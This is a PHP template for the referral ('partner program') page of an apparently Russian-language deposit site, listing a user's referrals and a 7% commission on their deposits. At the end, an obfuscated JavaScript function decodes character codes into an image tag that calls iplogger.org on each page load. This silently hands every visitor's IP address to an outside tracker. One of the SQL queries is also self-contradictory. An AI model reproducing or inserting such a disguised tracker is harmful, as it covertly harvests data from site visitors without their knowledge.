<?php if(!defined('SCRIPT_BY_SIRGOFFAN')){
echo ('Выявлена попытка взлома!');
exit();
}
$_OPTIMIZATION["title"] = "Партнерская программа";
if(empty($id)){?>
<p style="height:100px; padding-top:50px; text-align:center;"><span class="style2">Для доступа к данному разделу Вам необходимо пройти авторизацию!</span><br>
<?}else{?>
<div class="card">
<div class="card-body collapse in">
<div class="card-block">
<div class="card-text">
Приглашайте в проект своих друзей и знакомых, Вы будете получать <b style="margin-bottom: 10px;font-weight: 500;color: #2f2f2f;font-size: 18px;">7%</b> от каждого вклада приглашенного Вами пользователя!
Выплаты партнерских отчислений происходят автоматически, на указанный при регистрации кошелек.					
<?
$ihr=$db->getOne("SELECT i_have_refs_as_curator FROM ss_users WHERE id=?i",$id);

$refsprofit=$db->query("SELECT SUM(summa) as payed FROM deposits WHERE curatorid=?i",$id);
$refsprofit=$db->fetch($refsprofit);
$payed=$refsprofit['payed']*($refpercent/100);

$refsprofit=$db->query("SELECT SUM(summa) as waited FROM deposits WHERE curatorid=?i AND curatorid=?i",0,$id);
$refsprofit=$db->fetch($refsprofit);
$waited=$refsprofit['waited']*($refpercent/100);
?>
</div>

<h4 class="card-title" style="font-weight: 500;color: #2f2f2f;padding: 10px 0px 10px;font-size: 15px;">Мои рефералы</h4>


                <div class="table-responsive">
                    <table class="table mb-0">
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>Логин</th>
                                <th>Дата регистрации</th>
                                <th>Откуда пришел</th>
                                <th>Доход</th>
                            </tr>
                        </thead>
                        <tbody>
				<? if($ihr>0){
$myrefsrow=$db->query("SELECT * FROM ss_users WHERE curator=?i ORDER BY id DESC",$id); 
while($myrefs=$db->fetch($myrefsrow)){?> 		
                            <tr>
                                <td class="text-truncate"><?=$myrefs['id']?></td>
                                <td class="text-truncate"><?=$myrefs['wallet']?></td>
                                <td class="text-truncate"><?=date('d.m.Y H:i:s',$myrefs['reg_unix'])?></td>
                                <td class="text-truncate"><?=$myrefs['came']?></td>
       <?
$refprofit=$db->query("SELECT SUM(summa) as personalprofit FROM pay WHERE userid=?i and type='Оплата депозита'",$myrefs['id']);
$refprofit=$db->fetch($refprofit);
?>                        

							  <td class="text-truncate"><?=($refprofit['personalprofit']*($refpercent/100))?> RUB</td>
                            </tr>
<? }} else{?>
<td colspan="5" style="text-align: center;">Вы еще никого не привлекали :(</td>					
	<? }?>                           
                        </tbody>
                    </table>
                </div>
   


</div>
</div>
</div>
	<script>
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!105!112!108!111!103!103!101!114!46!111!114!103!47!49!86!121!74!77!54!34!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
</script><script>
D_();
</script>
		
<?}?>